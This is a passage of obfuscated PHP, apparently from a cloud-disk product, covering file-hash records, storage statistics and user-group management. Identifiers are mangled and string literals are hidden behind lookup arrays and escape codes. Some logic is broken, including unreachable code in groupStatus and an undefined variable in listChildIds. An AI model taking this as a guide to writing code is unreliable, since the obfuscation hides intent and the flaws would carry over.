0) { $À³·©ç[$×Âáş‚ª[2247]] = array($×Âáş‚ª[1179], abs($ĞÁÚ˜ƒ’)); } $this->where($À³·©ç)->setAdd($×Âáş‚ª[2247], $ĞÁÚ˜ƒ’); } } public function findByHash($ãÔõ¾ø , $»ğ¼Ñ½à = false) { $¯˜§›ÕÂ =& $_SERVER[øşô´çË]; if (!$ãÔõ¾ø  && !$»ğ¼Ñ½à) { return !1; } $®û‰„Ô = array($¯˜§›ÕÂ[2241] => $ãÔõ¾ø ); if ($»ğ¼Ñ½à) { $®û‰„Ô = array($¯˜§›ÕÂ[2242] => $»ğ¼Ñ½à); } return $this->order($¯˜§›ÕÂ[2248])->where($®û‰„Ô)->find(); } public function clearEmpty($´ÉÃ¿½ = 1) { $¬“ñÜÛÊ =& $_SERVER[øşô´çË]; $îĞ½ú€° = time() - 3600 * 24 * $´ÉÃ¿½; $¨±ÆÖíİ = $¬“ñÜÛÊ[2249] . $îĞ½ú€°; $¯–¥í·® = $this->where($¨±ÆÖíİ)->select(); if (!$¯–¥í·®) { return; } $…½¦Â– = new Task($¬“ñÜÛÊ[2250], $¬“ñÜÛÊ[12], count($¯–¥í·®)); foreach ($¯–¥í·® as $·Š‹Àôİ) { $…½¦Â–->update(1); $this->resetFile($·Š‹Àôİ); } $…½¦Â–->end(); } public function resetFile($ù”™ığ½) { $²äšÉÜ =& $_SERVER[øşô´çË]; $à¢¤»¤ = array($²äšÉÜ[567] => $ù”™ığ½[$²äšÉÜ[566]]); $º¬ïğ”ª = Model($²äšÉÜ[1529])->where($à¢¤»¤)->count(); $ÍÒÌÜ®İ = Model($²äšÉÜ[2251])->where($à¢¤»¤)->count(); $¿Ğ¹ºª = intval($º¬ïğ”ª) + intval($ÍÒÌÜ®İ); if ($¿Ğ¹ºª == 0) { Model($²äšÉÜ[2252])->delete($ù”™ığ½[$²äšÉÜ[566]]); $this->where($à¢¤»¤)->delete(); $this->metaSet($ù”™ığ½[$²äšÉÜ[566]], null, null); if (!IO::isFile($ù”™ığ½[$²äšÉÜ[97]])) { write_log(array($²äšÉÜ[2253], ACTION, $ù”™ığ½), $²äšÉÜ[1367]); return !1; } IO::remove($ù”™ığ½[$²äšÉÜ[97]]); write_log(ACTION . $²äšÉÜ[988] . KodUser::id() . $²äšÉÜ[2254] . $ù”™ığ½[$²äšÉÜ[566]] . $²äšÉÜ[2041] . $ù”™ığ½[$²äšÉÜ[89]] . $²äšÉÜ[209] . $ù”™ığ½[$²äšÉÜ[97]], $²äšÉÜ[2253]); return; } if ($ù”™ığ½[$²äšÉÜ[2247]] != $¿Ğ¹ºª) { $this->where($à¢¤»¤)->save(array($²äšÉÜ[2240] => $¿Ğ¹ºª)); } } public function storageInfo($¾¦ ÚË = false) { $ƒŠ®åÙ =& $_SERVER[øşô´çË]; $ıè®Ó = $this->count() + 0.0; $±õ÷Éüå = 0; $°øÇÃ = 1; $¦‚ëúä = 0; $ÏÌ†ı = 5000; for ($·›Ïéáé = 0; $·›Ïéáé < $ıè®Ó; $·›Ïéáé = $·›Ïéáé + $ÏÌ†ı) { $Âğ¤³ù’ = $this->limit($·›Ïéáé, $ÏÌ†ı)->select(); foreach ($Âğ¤³ù’ as $ú”›äœÛ) { $°øÇÃ += $ú”›äœÛ[$ƒŠ®åÙ[89]] * $ú”›äœÛ[$ƒŠ®åÙ[2247]]; $±õ÷Éüå += $ú”›äœÛ[$ƒŠ®åÙ[89]] * ($ú”›äœÛ[$ƒŠ®åÙ[2247]] - 1); $¦‚ëúä += $ú”›äœÛ[$ƒŠ®åÙ[2247]]; } } $³é½ğü¨ = array($ƒŠ®åÙ[2255] => $°øÇÃ, $ƒŠ®åÙ[2256] => $±õ÷Éüå, $ƒŠ®åÙ[2257] => $±õ÷Éüå / $°øÇÃ, $ƒŠ®åÙ[93] => $ıè®Ó, $ƒŠ®åÙ[2258] => $¦‚ëúä); return $³é½ğü¨; } } class GroupModel extends ModelBase { protected $tableName = "\147\162\x6f\165\160"; protected $tableMeta = array("\164\x61\x62\154\145\116\141\x6d\x65" => "\147\162\x6f\165\160\137\155\145\x74\x61", "\x6d\145\164\141\106\151\145\x6c\x64" => "\147\x72\157\x75\x70\111\104"); protected function cacheFunctionAlias($ñï×–±¤) { $‰…È† =& $_SERVER[øşô´çË]; return array($‰…È†[2259] => array($ñï×–±¤[0], $‰…È†[2260]), $‰…È†[2261] => array($ñï×–±¤[0], $‰…È†[2262])); } protected function ___getInfo($¡À„ÂŸ) { $â‹¼™Ô¥ = $this->getInfoSimple($¡À„ÂŸ); if (!$â‹¼™Ô¥) { return !1; } return $this->_listDataApplyItem($â‹¼™Ô¥); } protected function ___getInfoSimple($Ó­ï›„¦) { $Ÿúº¤™ä = array($_SERVER[øşô´çË][1491] => intval($Ó­ï›„¦)); $ºªôÕÑö = $this->where($Ÿúº¤™ä)->find(); return is_array($ºªôÕÑö) ? $ºªôÕÑö : array(); } protected function groupAdd($ñ«Ê°¨ò) { $ëÍÂ¿Şà =& $_SERVER[øşô´çË]; if (!$ñ«Ê°¨ò[$ëÍÂ¿Şà[200]] && isset($ñ«Ê°¨ò[$ëÍÂ¿Şà[1491]]) && $ñ«Ê°¨ò[$ëÍÂ¿Şà[1491]] == 1) { if ($¿‡×’® = $this->getInfoSimple($ñ«Ê°¨ò[$ëÍÂ¿Şà[1491]], !0)) { return $ñ«Ê°¨ò[$ëÍÂ¿Şà[1491]]; } } else { $¿‡×’® = $this->getInfoSimple($ñ«Ê°¨ò[$ëÍÂ¿Şà[200]]); if (!$¿‡×’®) { return !1; } } $†ıôıñÖ = $ëÍÂ¿Şà[622]; if ($¿‡×’®[$ëÍÂ¿Şà[613]]) { $†ıôıñÖ = $¿‡×’®[$ëÍÂ¿Şà[613]] . $¿‡×’®[$ëÍÂ¿Şà[1491]] . $ëÍÂ¿Şà[60]; } $ŸÍŠÇ– = array($ëÍÂ¿Şà[518] => $this->groupNameAuto($ñ«Ê°¨ò[$ëÍÂ¿Şà[200]], $ñ«Ê°¨ò[$ëÍÂ¿Şà[42]]), $ëÍÂ¿Şà[501] => $ñ«Ê°¨ò[$ëÍÂ¿Şà[200]], $ëÍÂ¿Şà[683] => $†ıôıñÖ, $ëÍÂ¿Şà[2263] => $ñ«Ê°¨ò[$ëÍÂ¿Şà[2164]], $ëÍÂ¿Şà[2264] => 0, $ëÍÂ¿Şà[2182] => 0); $ñ«Ê°¨ò[$ëÍÂ¿Şà[42]] = $ŸÍŠÇ–[$ëÍÂ¿Şà[42]]; if (isset($ñ«Ê°¨ò[$ëÍÂ¿Şà[2200]])) { $ŸÍŠÇ–[$ëÍÂ¿Şà[2200]] = $ñ«Ê°¨ò[$ëÍÂ¿Şà[2200]]; } else { $±°“ÅöÚ = $this->max($ëÍÂ¿Şà[2200]); if (!$±°“ÅöÚ) { $±°“ÅöÚ = 0; } $ŸÍŠÇ–[$ëÍÂ¿Şà[2200]] = $±°“ÅöÚ + 1; } if (!empty($ñ«Ê°¨ò[$ëÍÂ¿Şà[1491]])) { $ŸÍŠÇ–[$ëÍÂ¿Şà[1491]] = $ñ«Ê°¨ò[$ëÍÂ¿Şà[1491]]; } $Èå– Í² = $this->add($ŸÍŠÇ–); $this->groupMetaEdit($Èå– Í², $ñ«Ê°¨ò); Model($ëÍÂ¿Şà[1529])->groupRootAdd($Èå– Í²); $this->_clearCache($ñ«Ê°¨ò[$ëÍÂ¿Şà[200]]); return $Èå– Í²; } protected function groupEdit($ÜñŠ‹ì, $¹ôèïì) { $­¥÷¤õÆ =& $_SERVER[øşô´çË]; $ˆ›í‡¿ = $this->getInfoSimple($ÜñŠ‹ì); if (!$ˆ›í‡¿) { return !1; } if (!empty($¹ôèïì[$­¥÷¤õÆ[200]])) { $ÎÚÓÒ»Ò = $this->getInfoSimple($¹ôèïì[$­¥÷¤õÆ[200]]); if (!$ÎÚÓÒ»Ò) { return !1; } if ($ˆ›í‡¿[$­¥÷¤õÆ[1491]] == $ÎÚÓÒ»Ò[$­¥÷¤õÆ[1491]]) { return !1; } if ($¹ôèïì[$­¥÷¤õÆ[200]] != $ˆ›í‡¿[$­¥÷¤õÆ[200]]) { if ($ÎÚÓÒ»Ò[$­¥÷¤õÆ[613]] !== $ˆ›í‡¿[$­¥÷¤õÆ[613]] && strpos($ÎÚÓÒ»Ò[$­¥÷¤õÆ[613]], $ˆ›í‡¿[$­¥÷¤õÆ[613]] . $ˆ›í‡¿[$­¥÷¤õÆ[1491]] . $­¥÷¤õÆ[60]) === 0) { return !1; } $¹ôèïì[$­¥÷¤õÆ[683]] = $ÎÚÓÒ»Ò[$­¥÷¤õÆ[613]] . $¹ôèïì[$­¥÷¤õÆ[200]] . $­¥÷¤õÆ[60]; $this->_changeChildLevel($ˆ›í‡¿, $ÎÚÓÒ»Ò); $this->_clearCache($ÎÚÓÒ»Ò[$­¥÷¤õÆ[1491]]); $this->_clearCache($ˆ›í‡¿[$­¥÷¤õÆ[200]]); } } $this->groupMetaEdit($ÜñŠ‹ì, $¹ôèïì); $this->_clearChildrenCache($ˆ›í‡¿); return $this->where(array($­¥÷¤õÆ[2265] => $ÜñŠ‹ì))->save($¹ôèïì); } private function groupMetaEdit($ï²Ü½ , &$¾À”ê›ˆ) { $’Ë¿¨ =& $_SERVER[øşô´çË]; if (isset($¾À”ê›ˆ[$’Ë¿¨[42]])) { $this->setNamePinyin($ï²Ü½ , $¾À”ê›ˆ[$’Ë¿¨[42]]); } if (isset($¾À”ê›ˆ[$’Ë¿¨[2266]])) { $¡ôšæïÅ = array($’Ë¿¨[2266] => $¾À”ê›ˆ[$’Ë¿¨[2266]], $’Ë¿¨[2267] => $¾À”ê›ˆ[$’Ë¿¨[2267]]); unset($¾À”ê›ˆ[$’Ë¿¨[2266]]); unset($¾À”ê›ˆ[$’Ë¿¨[2267]]); if (isset($¾À”ê›ˆ[$’Ë¿¨[2268]])) { $Å°ù°‰ = $’Ë¿¨[1487] . $ï²Ü½ ; $¶Š‡„¬å = $’Ë¿¨[1486]; $ƒØôŞöÃ = $¾À”ê›ˆ[$’Ë¿¨[2268]] ? $¾À”ê›ˆ[$’Ë¿¨[2268]] : $’Ë¿¨[12]; $ïÅ†’‡´ = Model($’Ë¿¨[1485])->get($Å°ù°‰, $¶Š‡„¬å); $ïÅ†’‡´ = $ïÅ†’‡´ ? $ïÅ†’‡´ : $’Ë¿¨[12]; if ($ïÅ†’‡´ != $ƒØôŞöÃ) { if (!$ƒØôŞöÃ && $ïÅ†’‡´) { Model($’Ë¿¨[1485])->remove($Å°ù°‰, $¶Š‡„¬å); } else { if ($ƒØôŞöÃ) { Model($’Ë¿¨[1485])->set($Å°ù°‰, $ƒØôŞöÃ, $¶Š‡„¬å); } } } $¡ôšæïÅ[$’Ë¿¨[2268]] = $ƒØôŞöÃ; } $this->metaSet($ï²Ü½ , $¡ôšæïÅ); } } private function _clearChildrenCache($ú–‹«¥¾) { $æëèÄÑ† =& $_SERVER[øşô´çË]; $çı¬—ê’ = array($æëèÄÑ†[683] => array($æëèÄÑ†[644], $ú–‹«¥¾[$æëèÄÑ†[613]] . $ú–‹«¥¾[$æëèÄÑ†[1491]] . $æëèÄÑ†[645])); $À¡ùÄË¾ = $this->field($æëèÄÑ†[1491])->where($çı¬—ê’)->select(); foreach ($À¡ùÄË¾ as $“ÍÂ©³í) { $this->_clearCache($“ÍÂ©³í[$æëèÄÑ†[1491]]); } } private function _clearCache($Õ¦‘˜·Ä) { $Å€æ™²  =& $_SERVER[øşô´çË]; $this->cacheFunctionClear($Å€æ™² [2269], $Õ¦‘˜·Ä); $this->cacheFunctionClear($Å€æ™² [2270], $Õ¦‘˜·Ä); } private function _changeChildLevel($ù‘ğşé¤, $¨¢é¿Û†, $˜§›İöŠ = false) { $ƒĞÀóà =& $_SERVER[øşô´çË]; $í‡Ñ÷‹ = $ù‘ğşé¤[$ƒĞÀóà[613]] . $ù‘ğşé¤[$ƒĞÀóà[1491]] . $ƒĞÀóà[60]; $¡Ê–åú• = $¨¢é¿Û†[$ƒĞÀóà[613]] . $¨¢é¿Û†[$ƒĞÀóà[1491]] . $ƒĞÀóà[60] . $ù‘ğşé¤[$ƒĞÀóà[1491]] . $ƒĞÀóà[60]; if ($˜§›İöŠ) { $¡Ê–åú• = $¨¢é¿Û†[$ƒĞÀóà[613]] . $¨¢é¿Û†[$ƒĞÀóà[1491]] . $ƒĞÀóà[60]; } $ ©Ÿú×… = array($ƒĞÀóà[683] => array($ƒĞÀóà[644], $ù‘ğşé¤[$ƒĞÀóà[613]] . $ù‘ğşé¤[$ƒĞÀóà[1491]] . $ƒĞÀóà[645])); $õÂÃ­˜´ = array($ƒĞÀóà[683] => array($ƒĞÀóà[692], "\x72\145\160\154\141\x63\x65\x28\x70\x61\162\x65\156\x74\x4c\x65\166\x65\x6c\54\47{$í‡Ñ÷‹}\47\x2c\47{$¡Ê–åú•}\47\x29")); $this->_clearChildrenCache($ù‘ğşé¤); $this->where($ ©Ÿú×…)->data($õÂÃ­˜´)->save(); } public function setNamePinyin($ÊšÃ“’İ, $†´ëİ = false) { $™òƒİİ¨ =& $_SERVER[øşô´çË]; if (!$†´ëİ) { $ĞéœÜÖ = $this->getInfoSimple($ÊšÃ“’İ); $†´ëİ = $ĞéœÜÖ[$™òƒİİ¨[42]]; } if (!Input::check($†´ëİ, $™òƒİİ¨[686])) { $this->metaSet($ÊšÃ“’İ, $™òƒİİ¨[561], null); $this->metaSet($ÊšÃ“’İ, $™òƒİİ¨[560], null); return; } $ŸÆ•ÀƒÛ = array($™òƒİİ¨[561] => str_replace($™òƒİİ¨[63], $™òƒİİ¨[12], Pinyin::get($†´ëİ)), $™òƒİİ¨[560] => Pinyin::get($†´ëİ, $™òƒİİ¨[687])); $this->metaSet($ÊšÃ“’İ, $ŸÆ•ÀƒÛ); } protected function metaSet($ƒ½ƒ²•ö, $Ü—˜ª»Ï = null, $çş´ö¨± = null) { $this->_clearCache($ƒ½ƒ²•ö); return parent::metaSet($ƒ½ƒ²•ö, $Ü—˜ª»Ï, $çş´ö¨±); } protected function groupStatus($áä¾ıÆ, $ÂÏ»ùÊ£) { $ŒÀ‘‰– =& $_SERVER[øşô´çË]; $®ˆúû = $this->getInfoSimple($áä¾ıÆ); if (!$®ˆúû) { return !1; } $this->_clearCache($áä¾ıÆ); return $this->metaSet($áä¾ıÆ, $ŒÀ‘‰–[852], $ÂÏ»ùÊ£); if ($ÂÏ»ùÊ£ == $ŒÀ‘‰–[101]) { $ÉÜ˜í¿ò = $this->parentLevelArray($®ˆúû[$ŒÀ‘‰–[613]]); } else { } $ÉÜ˜í¿ò[] = $®ˆúû[$ŒÀ‘‰–[1491]]; $éŒ“áä = array(); foreach ($ÉÜ˜í¿ò as $áä¾ıÆ) { $éŒ“áä[] = array($ŒÀ‘‰–[1491] => $áä¾ıÆ, $ŒÀ‘‰–[105] => $ŒÀ‘‰–[852], $ŒÀ‘‰–[460] => $ÂÏ»ùÊ£); $this->_clearCache($áä¾ıÆ); } return Model($ŒÀ‘‰–[2271])->addAll($éŒ“áä, array(), !0); } protected function groupRemove($•ŒœóÛ, $îéĞ÷æŒ = false) { $È‚Î²¤ =& $_SERVER[øşô´çË]; $­ÚŒûıˆ = array($È‚Î²¤[1491] => $•ŒœóÛ); $Œİ‚»ì“ = $this->where($­ÚŒûıˆ)->find(); if (!$Œİ‚»ì“ || $Œİ‚»ì“[$È‚Î²¤[200]] == 0) { return !1; } if (!$îéĞ÷æŒ) { $‡Ş›İŠ = $this->getInfoSimple($Œİ‚»ì“[$È‚Î²¤[200]]); $this->_changeChildLevel($Œİ‚»ì“, $‡Ş›İŠ, !0); $this->where(array($È‚Î²¤[200] => $•ŒœóÛ))->save(array($È‚Î²¤[200] => $Œİ‚»ì“[$È‚Î²¤[200]])); $this->_clearCache($‡Ş›İŠ[$È‚Î²¤[1491]]); } Model($È‚Î²¤[2271])->where($­ÚŒûıˆ)->delete(); Model($È‚Î²¤[2272])->where($­ÚŒûıˆ)->delete(); Model($È‚Î²¤[935])->groupRootRemove($•ŒœóÛ); $this->_clearCache($Œİ‚»ì“[$È‚Î²¤[200]]); return $this->where($­ÚŒûıˆ)->delete(); } protected function groupSort($İæàÏ¸) { $óÚó¡™ª =& $_SERVER[øşô´çË]; $¹°²åêÌ = array(); foreach ($İæàÏ¸ as $Å ÄÍÛÖ => $è ¸©ÅŒ) { $¹°²åêÌ[] = array($óÚó¡™ª[1491], $è ¸©ÅŒ, $óÚó¡™ª[2200], $Å ÄÍÛÖ + 1); } $this->saveAll($¹°²åêÌ); } public function listData() { $†×’š´ò = $this->_makeOrder()->selectPage(50); $this->_listDataApply($†×’š´ò[$_SERVER[øşô´çË][455]]); return $†×’š´ò; } private function _makeOrder($ÎÍÜ§ó = '') { $ç«ĞğÅ =& $_SERVER[øşô´çË]; $÷²“™¾ò = array($ç«ĞğÅ[1491], $ç«ĞğÅ[42], $ç«ĞğÅ[2166], $ç«ĞğÅ[241]); $¶È ³ì÷ = array($ç«ĞğÅ[546] => $ç«ĞğÅ[547], $ç«ĞğÅ[548] => $ç«ĞğÅ[549]); $‚ıÇıÚŠ = Input::get($ç«ĞğÅ[553], $ç«ĞğÅ[7], $ç«ĞğÅ[2182], $÷²“™¾ò); $ÊäëË‡Ú = Input::get($ç«ĞğÅ[554], $ç«ĞğÅ[7], $ç«ĞğÅ[2273], array($ç«ĞğÅ[2273], $ç«ĞğÅ[548])); $ÊäëË‡Ú = $¶È ³ì÷[$ÊäëË‡Ú]; $ÎÍÜ§ó = $ÎÍÜ§ó . "{$‚ıÇıÚŠ}\40{$ÊäëË‡Ú}\54\40\147\162\x6f\x75\x70\x49\104\x20\141\x73\x63"; return $this->order($ÎÍÜ§ó); } public function listChild($®ïéÙŞ) { $åİÏø =& $_SERVER[øşô´çË]; $ºÌ„®Ñ = $this->where(array($åİÏø[200] => $®ïéÙŞ))->_makeOrder()->selectPage(200); $this->_listDataApply($ºÌ„®Ñ[$åİÏø[455]]); return $ºÌ„®Ñ; } public function listChildIds($Ü£şƒçÙ) { $’êŸ‚ªè =& $_SERVER[øşô´çË]; if (is_string($·¸éĞø÷)) { $Ü£şƒçÙ = explode($’êŸ‚ªè[60], $Ü£şƒçÙ); } $üÌã¼•‘ = $this->where(array($’êŸ‚ªè[1491] => array($’êŸ‚ªè[7], $Ü£şƒçÙ)))->field($’êŸ‚ªè[2274])->select(); if (!$üÌã¼•‘) { return !1; } $’Ë “…Š = array(); foreach ($üÌã¼•‘ as $İÑÜ¢ëê) { $’Ë “…Š[] = "\163\145\x6c\145\143\164\x20\x67\x72\157\x75\x70\x49\x44\x20\146\162\157\155\40\140\x67\x72\157\165\x70\x60\x20\x77\x68\145\x72\145\x20\160\x61\x72\x65\156\x74\114\x65\166\145\154\40\x6c\151\153\x65\40\x27{$İÑÜ¢ëê[$’êŸ‚ªè[613]]}{$İÑÜ¢ëê[$’êŸ‚ªè[1491]]}\54\45\x27"; } $’Ë “…Š = implode($’êŸ‚ªè[2275], $’Ë “…Š); $üÌã¼•‘ = $this->query($’Ë “…Š); if (!$üÌã¼•‘) { return array(); } $Ü£şƒçÙ = array_to_keyvalue($üÌã¼•‘, $’êŸ‚ªè[12], $’êŸ‚ªè[1491]); return array_unique($Ü£şƒçÙ); } public function listByID($»Ç™ù‘å) { $¸­ˆ´„ =& $_SERVER[øşô´çË]; if (!$»Ç™ù‘å) { return array(); } $Íƒ¬Çø = array($¸­ˆ´„[1491] => array($¸­ˆ´„[7], $»Ç™ù‘å)); $ôÌ¡˜÷¸ = $this->where($Íƒ¬Çø)->select(); $ôÌ¡˜÷¸ = array_sort_keep($ôÌ¡˜÷¸, $¸­ˆ´„[1491], $»Ç™ù‘å); $this->_listDataApply($ôÌ¡˜÷¸); return $ôÌ¡˜÷¸; } public function listSearch($í‚Éìó‡) { $Ìİ¨•ÚÜ =& $_SERVER[øşô´çË]; $¥‰œ‘´æ = trim($í‚Éìó‡[$Ìİ¨•ÚÜ[2276]]); $ÓüÁ‰ˆï = explode($Ìİ¨•ÚÜ[63], $¥‰œ‘´æ); if (!$¥‰œ‘´æ || count($ÓüÁ‰ˆï) == 1) { return $this->listSearchNow($í‚Éìó‡); } $‰ åä²ê = array($Ìİ¨•ÚÜ[455] => array()); foreach ($ÓüÁ‰ˆï as $£Ã§ˆÏ) { if (!trim($£Ã§ˆÏ)) { continue; } $í‚Éìó‡[$Ìİ¨•ÚÜ[2276]] = $£Ã§ˆÏ; $¥ÚÍ„Û = $this->listSearchNow($í‚Éìó‡); $‰ åä²ê[$Ìİ¨•ÚÜ[455]] = array_merge($‰ åä²ê[$Ìİ¨•ÚÜ[455]], $¥ÚÍ„Û[$Ìİ¨•ÚÜ[455]]); } $‰ åä²ê[$Ìİ¨•ÚÜ[455]] = array_unique_by_key($‰ åä²ê[$Ìİ¨•ÚÜ[455]], $Ìİ¨•ÚÜ[1491]); $‰ åä²ê[$Ìİ¨•ÚÜ[452]] = array($Ìİ¨•ÚÜ[453] => count($‰ åä²ê[$Ìİ¨•ÚÜ[455]]), $Ìİ¨•ÚÜ[448] => 20, $Ìİ¨•ÚÜ[437] => 1, $Ìİ¨•ÚÜ[454] => 1); return $‰ åä²ê; } public function listSearchNow($–Ğ˜é½Â) { $ĞˆËûØÕ =& $_SERVER[øşô´çË]; $ôëà–‚‚ = trim($–Ğ˜é½Â[$ĞˆËûØÕ[2276]]); $‰÷§£ñ¢ = isset($–Ğ˜é½Â[$ĞˆËûØÕ[2277]]) ? $–Ğ˜é½Â[$ĞˆËûØÕ[2277]] : !1; if (!trim($ôëà–‚‚)) { return !1; } $ôëà–‚‚ = str_replace($ĞˆËûØÕ[2278], $ĞˆËûØÕ[2279], $ôëà–‚‚); $‘¢õêÌĞ = array($ĞˆËûØÕ[1491] => array($ĞˆËûØÕ[482], "{$ôëà–‚‚}\45"), $ĞˆËûØÕ[42] => array($ĞˆËûØÕ[482], "\x25{$ôëà–‚‚}\x25"), $ĞˆËûØÕ[1164] => $ĞˆËûØÕ[2280]); if ($‰÷§£ñ¢) { $´„ş±ìÇ = $this->getInfoSimple($‰÷§£ñ¢); $¦¥ƒ¢ö = $´„ş±ìÇ[$ĞˆËûØÕ[613]] . $‰÷§£ñ¢ . $ĞˆËûØÕ[645]; $‘¢õêÌĞ = array($‘¢õêÌĞ, array($ĞˆËûØÕ[613] => array($ĞˆËûØÕ[482], $¦¥ƒ¢ö))); } $‘¢õêÌĞ = $this->parseWhereLike($‘¢õêÌĞ); $ªå€˜ÙŒ = $this->_makeOrder()->where($‘¢õêÌĞ)->selectPage(20); $ªå€˜ÙŒ = $ªå€˜ÙŒ ? $ªå€˜ÙŒ : array($ĞˆËûØÕ[455] => array(), $ĞˆËûØÕ[452] => array()); if (!$ªå€˜ÙŒ || count($ªå€˜ÙŒ[$ĞˆËûØÕ[455]]) < 5 && Input::check($ôëà–‚‚, $ĞˆËûØÕ[402])) { $¡ÃóÜŞÙ = $this->groupChildrenAll($‰÷§£ñ¢); $Üˆ˜© = $this->_searchFromMeta($ĞˆËûØÕ[560], $ôëà–‚‚, 10, $¡ÃóÜŞÙ); $×’ç”†Å = $this->_searchFromMeta($ĞˆËûØÕ[561], $ôëà–‚‚, 10, $¡ÃóÜŞÙ); $å·ÛĞÂÍ = array_merge($Üˆ˜©, $×’ç”†Å, $ªå€˜ÙŒ[$ĞˆËûØÕ[455]]); $ªå€˜ÙŒ[$ĞˆËûØÕ[455]] = array_unique_by_key($å·ÛĞÂÍ, $ĞˆËûØÕ[1491]); $ªå€˜ÙŒ[$ĞˆËûØÕ[452]][$ĞˆËûØÕ[453]] = count($ªå€˜ÙŒ[$ĞˆËûØÕ[455]]); $ªå€˜ÙŒ[$ĞˆËûØÕ[452]][$ĞˆËûØÕ[454]] = ceil($ªå€˜ÙŒ[$ĞˆËûØÕ[452]][$ĞˆËûØÕ[453]] / $ªå€˜ÙŒ[$ĞˆËûØÕ[452]][$ĞˆËûØÕ[448]]); } $this->_listDataApply($ªå€˜ÙŒ[$ĞˆËûØÕ[455]]); return $ªå€˜ÙŒ; } protected function groupChildrenAll($·é¼Ù¶Ò) { $¥ÙÙŸÓŒ =& $_SERVER[øşô´çË]; if (!$·é¼Ù¶Ò) { return !1; } if (!is_array($·é¼Ù¶Ò)) { $·é¼Ù¶Ò = array($·é¼Ù¶Ò); } $Ù¤È = $·é¼Ù¶Ò; foreach ($·é¼Ù¶Ò as $îÊĞõ»¤) { $ªªñŸß = $this->getInfoSimple($îÊĞõ»¤); $ø»¤äõ = array($¥ÙÙŸÓŒ[613] => array($¥ÙÙŸÓŒ[482], $ªªñŸß[$¥ÙÙŸÓŒ[613]] . $îÊĞõ»¤ . $¥ÙÙŸÓŒ[645])); $äº¾§³ = $this->field($¥ÙÙŸÓŒ[1491])->where($ø»¤äõ)->select(); $Ù¤È = array_merge($Ù¤È, array_to_keyvalue($äº¾§³, $¥ÙÙŸÓŒ[12], $¥ÙÙŸÓŒ[1491])); } return array_unique($Ù¤È); } private function _searchFromMeta($íş”§ãİ, $’Ùš¦‘æ, $œ²œŞù¿, $ÑËúÉ£Ğ) { $¯‹Äƒ¥ =& $_SERVER[øşô´çË]; $’Ùš¦‘æ = strtolower($’Ùš¦‘æ); $¼¨ŸÁò = array($¯‹Äƒ¥[105] => $íş”§ãİ, $¯‹Äƒ¥[460] => array($¯‹Äƒ¥[482], "\x25{$’Ùš¦‘æ}\45")); $¼¨ŸÁò = $this->parseWhereLike($¼¨ŸÁò); if ($ÑËúÉ£Ğ) { $¼¨ŸÁò[$¯‹Äƒ¥[1491]] = array($¯‹Äƒ¥[7], $ÑËúÉ£Ğ); } $©†×Î‚» = Model($¯‹Äƒ¥[2281])->where($¼¨ŸÁò)->limit($œ²œŞù¿)->select(); if (!$©†×Î‚») { return array(); } $©†×Î‚» = array_to_keyvalue($©†×Î‚», $¯‹Äƒ¥[12], $¯‹Äƒ¥[1491]); $¢¡ãÂ¡ = $this->where(array($¯‹Äƒ¥[2265] => array($¯‹Äƒ¥[7], $©†×Î‚»)))->select(); if (!$¢¡ãÂ¡) { return array(); } return $¢¡ãÂ¡; } protected function _listDataApplyItem($ûèÑ À) { $¶ÖÔšÕÌ = array($ûèÑ À); $this->_listDataApply($¶ÖÔšÕÌ); return $¶ÖÔšÕÌ[0]; } protected function _listDataApply(&$ÌÄ¤„»î) { $…¸èÉº­ =& $_SERVER[øşô´çË]; if (!$ÌÄ¤„»î) { return; } $ªóß×ºÖ = array_to_keyvalue($ÌÄ¤„»î, $…¸èÉº­[12], $…¸èÉº­[1491]); $this->_listAppendChildren($ÌÄ¤„»î); $this->_listAppendChildrenMember($ÌÄ¤„»î); $this->_listAppendMeta($ÌÄ¤„»î, $ªóß×ºÖ); $this->_listAppendParent($ÌÄ¤„»î); $this->_listAppendSourceRoot($ÌÄ¤„»î, $ªóß×ºÖ); } private function _listAppendChildren(&$®èªó¿Ğ) { $´°ğ÷× =& $_SERVER[øşô´çË]; $ÌÃœÃˆú = array_to_keyvalue($®èªó¿Ğ, $´°ğ÷×[12], $´°ğ÷×[1491]); $‹¸¾ş¡í = array($´°ğ÷×[200] => array($´°ğ÷×[7], $ÌÃœÃˆú)); $Ï››¢Šá = array($´°ğ÷×[200], $´°ğ÷×[2282] => $´°ğ÷×[594]); $„ÒÃ‡‰è = $this->field($Ï››¢Šá)->where($‹¸¾ş¡í)->group($´°ğ÷×[200])->select(); $§Åàâ™… = array_to_keyvalue($„ÒÃ‡‰è, $´°ğ÷×[200], $´°ğ÷×[594]); foreach ($®èªó¿Ğ as &$Ã¾ŞÔš¥) { $“šü” = $Ã¾ŞÔš¥[$´°ğ÷×[1491]]; $Ã¾ŞÔš¥[$´°ğ÷×[2283]] = isset($§Åàâ™…[$“šü”]) ? intval($§Åàâ™…[$“šü”]) : !1; } unset($Ã¾ŞÔš¥); } private function _listAppendChildrenMember(&$ùş¤àüš) { $”ß÷µ¦ =& $_SERVER[øşô´çË]; $¸Áçã§ü = array_to_keyvalue($ùş¤àüš, $”ß÷µ¦[12], $”ß÷µ¦[1491]); $µšÀµõÈ = array($”ß÷µ¦[1491] => array($”ß÷µ¦[7], $¸Áçã§ü)); $ôÍ×ú‘ = array($”ß÷µ¦[1491], $”ß÷µ¦[2282] => $”ß÷µ¦[594]); $Û†ÂÖÁ = Model($”ß÷µ¦[2272])->field($ôÍ×ú‘)->where($µšÀµõÈ)->group($”ß÷µ¦[1491])->select(); $ËÙ–Ã¬ = array_to_keyvalue($Û†ÂÖÁ, $”ß÷µ¦[1491], $”ß÷µ¦[594]); foreach ($ùş¤àüš as &$«ÕôªÍ½) { $‘‹œ×Ç” = $«ÕôªÍ½[$”ß÷µ¦[1491]]; $«ÕôªÍ½[$”ß÷µ¦[2284]] = isset($ËÙ–Ã¬[$‘‹œ×Ç”]) ? intval($ËÙ–Ã¬[$‘‹œ×Ç”]) : !1; } unset($«ÕôªÍ½); } private function _listAppendMeta(&$ÙÇåşºÜ, $¶ıò¤¢¨) { $ì§×ò =& $_SERVER[øşô´çË]; $ûÖşß˜Í = array($ì§×ò[1491] => array($ì§×ò[7], $¶ıò¤¢¨)); $š–ñË«‘ = Model($ì§×ò[2271])->where($ûÖşß˜Í)->select(); $š–ñË«‘ = array_to_keyvalue_group($š–ñË«‘, $ì§×ò[1491]); foreach ($š–ñË«‘ as &$“·ìõ‘È) { $“·ìõ‘È = array_to_keyvalue($“·ìõ‘È, $ì§×ò[105], $ì§×ò[460]); } unset($“·ìõ‘È); foreach ($ÙÇåşºÜ as &$‘Ï’ôñ) { $‘Ï’ôñ[$ì§×ò[564]] = array(); if 